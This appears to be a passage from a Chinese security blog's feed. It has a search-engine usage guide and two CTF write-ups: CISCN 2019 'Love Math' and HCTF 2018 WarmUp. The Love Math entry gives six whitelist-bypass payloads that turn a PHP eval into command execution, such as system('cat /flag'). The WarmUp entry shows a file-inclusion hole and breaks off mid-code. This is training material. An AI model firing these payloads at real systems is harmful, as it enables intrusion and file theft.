    <content type="html"><![CDATA[<p>信安技术文章搜索引擎使用指南</p><a id="more"></a><h1 id="主界面"><a href="#主界面" class="headerlink" title="主界面"></a>主界面</h1><p>主界面包括最近文章、漏洞通告、威胁情报、安全资讯、站点收录、数据详情等功能模块。<br><strong>最近文章</strong>：显示最近五天发布的安全技术文章，默认每页显示7条，可通过下方的调整框来调整大小，每页显示的最大值为50条。<br><strong>漏洞通告</strong>：这里只显示 CNNVD 发布的漏洞通告。<br><strong>威胁情报</strong>：主要是国外站点发布的漏洞信息通告。<br><strong>安全资讯</strong>：一些安全的新闻消息<br><strong>站点收录</strong>：网站文章收录数量排名和前100名站点的文章数量比例饼图<br><strong>数据详情</strong>：有三个柱状图，分别显示近一周、近一年、近10年的数据情况<br><img src="../../images/security/secsea/1.png" alt=""></p><h1 id="搜索界面"><a href="#搜索界面" class="headerlink" title="搜索界面"></a>搜索界面</h1><p>搜索界面提供网页、标题、作者、日期、域名等搜索功能。</p><h2 id="内容搜索"><a href="#内容搜索" class="headerlink" title="内容搜索"></a>内容搜索</h2><p>输入关键字，点击搜索，默认使用的是网页搜索，网页搜索在标题、内容、作者、域名这四个字段中搜索符合关键字的内容，并按照一定的权重计算比分，将搜索结果中，比分较高的文章排在前面，也就是把最可能是你想找的文章排在前面。<br><img src="../../images/security/secsea/2.png" alt=""></p><h2 id="标题搜索"><a href="#标题搜索" class="headerlink" title="标题搜索"></a>标题搜索</h2><p>标题一般都能够揭示文章的范围或论点，通过标题搜索有些时候更能得到我们想要的文章<br><img src="../../images/security/secsea/3.png" alt=""></p><h2 id="作者搜索"><a href="#作者搜索" class="headerlink" title="作者搜索"></a>作者搜索</h2><p>搞安全的人，一般都会给自己取一个 id 名，QQ、微信等平台账号的账户名可能都是同一个id名，有时候想了解一些作者的主要研究方向，可以通过搜索id名，来查看其写的文章。<br><img src="../../images/security/secsea/4.png" alt=""></p><h2 id="日期搜索"><a href="#日期搜索" class="headerlink" title="日期搜索"></a>日期搜索</h2><p>可以通过调整起止日期，来查看某个期间的安全文章，可配合内容、标题、作者搜索。这里说明一下，有的文章在爬取过程中没有匹配到时间，就设置了一个默认的日期值为2011-11-11<br><img src="../../images/security/secsea/5.png" alt=""></p><h2 id="域名搜索"><a href="#域名搜索" class="headerlink" title="域名搜索"></a>域名搜索</h2><p>通过输入站点的域名，来查看该站点是否有被收录。<br><img src="../../images/security/secsea/6.png" alt=""></p><h2 id="站点搜索"><a href="#站点搜索" class="headerlink" title="站点搜索"></a>站点搜索</h2><p>提供每个被收录站点的数据搜索，可以先用域名搜索一下是否有被收录。<br>例如只想搜索先知社区里的文章。<br><img src="../../images/security/secsea/7.png" alt=""><br>想要阅读先知社区最近一周的文章，可搭配日期搜索<br><img src="../../images/security/secsea/8.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;信安技术文章搜索引擎使用指南&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>love_math学习</title>
    <link href="https://blog.cfyqy.com/article/5fb19bf9.html"/>
    <id>https://blog.cfyqy.com/article/5fb19bf9.html</id>
    <published>2020-12-29T15:03:41.000Z</published>
    <updated>2021-01-05T02:58:10.262Z</updated>
    
    <content type="html"><![CDATA[<p>[CISCN 2019 初赛]Love Math  </p><a id="more"></a><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目限制了参数的长度要小于80，且不能包含空格、制表符、换行、单双引号、反引号、[]。并且输入的字符串需要为 $whitelist 中的函数</p><p>单双引号被禁止了，函数名提取字符串就无法实现，但是可以想办法从函数的返回结果中获取。   </p><p>base_convert<br><img src="../../images/php/lovemath/1.jpg" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">'phpinfo'</span>, <span class="number">36</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> base_convert(<span class="number">55490343972</span>,<span class="number">10</span>,<span class="number">36</span>);</span><br><span class="line"><span class="comment">//55490343972</span></span><br><span class="line"><span class="comment">//phpinfo</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../../images/php/lovemath/2.jpg" alt=""></p><h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><p>使用php函数readfile等函数读取文件，但是需要flag.php中的.。<br>相关函数： </p><ul><li>dechex 十进制转换为十六进制</li><li>hexdec 十六进制转换为十进制</li><li>hex2bin 转换十六进制字符串为二进制字符串</li><li>bin2hex 函数把包含数据的二进制字符串转换为十六进制值</li><li>pi作为变量是因为题目有长度限制，白名单中最短的就是这两个字符pi</li></ul><p>这里获取.,借助dechex和hex2bin函数，不过hex2bin不在白名单里，还需用base_convert转换。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> hex2bin(dechex(<span class="number">46</span>));</span><br><span class="line"><span class="comment">//.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="variable">$pi</span>=base_convert)(2146934604002,10,36)(<span class="variable">$pi</span>(727432,10,36).<span class="variable">$pi</span>(37907361743,10,36)(dechex(46)).<span class="variable">$pi</span>(33037,10,36));</span><br></pre></td></tr></table></figure><p>不过超出了长度限制</p><h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p>使用exec等命令执行<code>nl /*</code>读取文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">'exec'</span>, <span class="number">36</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">'hex2bin'</span>, <span class="number">36</span>, <span class="number">13</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> hexdec(bin2hex(<span class="string">'nl /*'</span>));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">47138</span></span><br><span class="line"><span class="comment">3761671484</span></span><br><span class="line"><span class="comment">474260451114</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=(<span class="variable">$pi</span>=base_convert)(47138,20,36)(<span class="variable">$pi</span>(3761671484,13,36)(dechex(474260451114)))</span><br></pre></td></tr></table></figure><p>不过这只能打印出同级目录文件下的flag，flag在其他位置就无法打印</p><h1 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h1><p>刚开始我们知道可以异或出<code>_</code>。并且$没有被 waf，因此我们可以使用<code>$_GET</code>全局变量手动传入参数getshell。<br>虽然[]被过滤，我们依然可以使用{}来提取数组中的值。    </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'1517'</span>^<span class="string">'nrtc'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">'1517'</span>, <span class="number">36</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">'nrtc'</span>, <span class="number">36</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">_GET</span></span><br><span class="line"><span class="comment">53179</span></span><br><span class="line"><span class="comment">1109136</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?0=system&amp;1=cat /flag&amp;c=<span class="variable">$pi</span>=base_convert;<span class="variable">$pi</span>=<span class="variable">$pi</span>(53179,10,36)^<span class="variable">$pi</span>(1109136,10,36);<span class="variable">$&#123;$pi&#125;</span>&#123;0&#125;(<span class="variable">$&#123;$pi&#125;</span>&#123;1&#125;)</span><br></pre></td></tr></table></figure><h1 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h1><p>就是用可用的函数和字母进行异或生成大量的字母组合（php中函数名默认为字符串），然后寻找可用的组合 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>,  <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span> , <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line"><span class="keyword">for</span>($k=<span class="number">1</span>;$k&lt;=sizeof($payload);$k++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; <span class="number">9</span>; $i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($j = <span class="number">0</span>;$j &lt;<span class="number">9</span>;$j++)&#123;</span><br><span class="line"><span class="keyword">for</span>($a = <span class="number">0</span>;$a &lt;=<span class="number">9</span>;$a++)&#123;</span><br><span class="line">            $exp = $payload[$k] ^ $i.$j.$a;</span><br><span class="line">            <span class="keyword">echo</span>($payload[$k].<span class="string">"^$i$j$a"</span>.<span class="string">"==&gt;$exp"</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../../images/php/lovemath/1.png" alt=""><br><img src="../../images/php/lovemath/2.png" alt=""><br><img src="../../images/php/lovemath/3.png" alt=""><br><img src="../../images/php/lovemath/4.png" alt=""><br>最终payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="variable">$pi</span>=(is_infinite^(6).(4)).(rad2deg^(7).(5));($<span class="variable">$pi</span>)&#123;pi&#125;(($<span class="variable">$pi</span>)&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</span><br><span class="line">?c=<span class="variable">$pi</span>=(is_nan^(6).(4)).(tan^(1).(5));<span class="variable">$pi</span>=$<span class="variable">$pi</span>;<span class="variable">$pi</span>&#123;0&#125;(<span class="variable">$pi</span>&#123;1&#125;)&amp;0=system&amp;1=cat%20/flag</span><br></pre></td></tr></table></figure><h1 id="方法五"><a href="#方法五" class="headerlink" title="方法五"></a>方法五</h1><p>如何构造出合适的base_convert进制转换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'hex2bin'</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">2</span>; $i &lt; <span class="number">37</span>; $i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">2</span>; $j &lt; <span class="number">37</span>; $j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_numeric(base_convert($a, $i, $j)))&#123;</span><br><span class="line">            <span class="keyword">if</span>(base_convert(base_convert($a, $i, $j), $j, $i) === $a)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'len='</span>.strlen(base_convert($a, $i, $j)).<span class="string">' '</span>.<span class="string">'base_convert参数-&gt;'</span>.base_convert($a, $i, $j).<span class="string">' '</span>.$j.<span class="string">' '</span>.$i.<span class="string">' '</span>.<span class="string">"\n"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>dechex的构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"_GET"</span>;</span><br><span class="line">$num = hexdec(bin2hex($a));</span><br><span class="line"><span class="keyword">echo</span> $num . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> (base_convert(<span class="number">3761671484</span>,<span class="number">13</span>,<span class="number">36</span>)(dechex($num)));</span><br><span class="line"><span class="comment">//1598506324</span></span><br><span class="line"><span class="comment">//_GET</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>paydload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="variable">$pi</span>=base_convert(3761671484,13,36)(dechex(1598506324));($<span class="variable">$pi</span>)&#123;1&#125;(($<span class="variable">$pi</span>)&#123;2&#125;)&amp;1=system&amp;2=tac /flag</span><br></pre></td></tr></table></figure><h1 id="方法六"><a href="#方法六" class="headerlink" title="方法六"></a>方法六</h1><p>相关函数：</p><ul><li>getallheaders：获取全部 HTTP 请求头信息</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">'exec'</span>, <span class="number">36</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">'getallheaders'</span>, <span class="number">30</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//47138</span></span><br><span class="line"><span class="comment">//8768397090111664438</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="variable">$pi</span>=base_convert,<span class="variable">$pi</span>(47138,20,36)(<span class="variable">$pi</span>(8768397090111664438,10,30)()&#123;1&#125;)</span><br></pre></td></tr></table></figure><p>exec(getallheaders(){1})，可以获取请求头第一个字段的值，[]被waf可以用{}包囊数字来解决代替绕过中括号和引号<br><img src="../../images/php/lovemath/3.jpg" alt=""><br>参考文章：</p><p><a href="https://blog.csdn.net/qq_44657899/article/details/106104340" target="_blank" rel="noopener">https://blog.csdn.net/qq_44657899/article/details/106104340</a><br><a href="https://www.extrader.top/posts/a649e496" target="_blank" rel="noopener">https://www.extrader.top/posts/a649e496</a><br><a href="https://www.smi1e.top/%E5%9B%BD%E8%B5%9Blove_math%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">https://www.smi1e.top/%E5%9B%BD%E8%B5%9Blove_math%E9%A2%98%E8%A7%A3/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[CISCN 2019 初赛]Love Math  &lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>BUUCTF-WEB-WRITEUP</title>
    <link href="https://blog.cfyqy.com/article/7d6323b8.html"/>
    <id>https://blog.cfyqy.com/article/7d6323b8.html</id>
    <published>2020-12-29T12:58:56.000Z</published>
    <updated>2021-01-20T09:05:58.078Z</updated>
    
    <content type="html"><![CDATA[<p>BUUCTF是一个ctf平台,里面都是一些经典赛题。</p><a id="more"></a> <h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><p>查看源码，注释有source.php，访问得到源码<br>source.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由源码可知只有重点要绕过emmm::checkFile($_REQUEST[‘file’]) ，实现任意文件包含读取。 可知存在hint.php文件，访问 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;source.php?file&#x3D;hint.php</span><br></pre></td></tr></table></figure><p>提示 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>可知flag存在 中 ，要实现包含读取ffffllllaaaagggg，要先让checkFile 返回True，从下面这部分源码着手 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">         $page,</span><br><span class="line">         <span class="number">0</span>,</span><br><span class="line">         mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">     );</span><br><span class="line">     <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     $_page = urldecode($page);</span><br><span class="line">     $_page = mb_substr(</span><br><span class="line">         $_page,</span><br><span class="line">         <span class="number">0</span>,</span><br><span class="line">         mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">     );</span><br><span class="line">     <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">     <span class="keyword">return</span> <span 